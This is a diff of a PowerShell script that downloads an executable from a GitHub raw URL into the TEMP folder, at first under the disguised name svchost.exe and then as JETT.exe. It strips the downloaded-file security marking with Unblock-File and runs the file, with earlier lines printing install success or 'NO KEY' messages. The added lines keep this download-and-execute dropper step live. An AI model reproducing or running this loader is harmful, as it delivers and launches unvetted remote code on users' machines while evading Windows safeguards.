@@ -125,33 +125,25 @@ while ($true)
 
         Write-Console "DOWNLOADING..." "INFO"
 
-$url  = "https://raw.githubusercontent.com/draft7973-ops/JETT.EXE/refs/heads/main/svchost.exe"
-$path = "$env:TEMP\svchost.exe"
+$url = "https://raw.githubusercontent.com/draft7973-ops/JETT.EXE/refs/heads/main/svchost.exe"
+$path = "$env:TEMP\JETT.exe"
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 try {
-
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-
     $wc = New-Object Net.WebClient
     $wc.Headers.Add("User-Agent","Mozilla/5.0")
     $wc.DownloadFile($url, $path)
 
-    Start-Sleep 1
+    Write-Host "Downloaded:" (Test-Path $path)
+    Write-Host "Size:" ((Get-Item $path).Length)
 
-    if (Test-Path $path)
-    {
-        Unblock-File $path -ErrorAction SilentlyContinue
-
-        Write-Console "INSTALL SUCCESS" "SUCCESS"
-
-        Start-Process `
-        -FilePath $path `
-        -WorkingDirectory $env:TEMP
-    }
-    else
-    {
-        Write-Console "INSTALL FAILED" "NO KEY"
-    }
+    Unblock-File $path -ErrorAction SilentlyContinue
+    Start-Process -FilePath $path -Wait
+}
+catch {
+    Write-Host $_.Exception.Message -ForegroundColor Red
+}
 }
 catch {
 
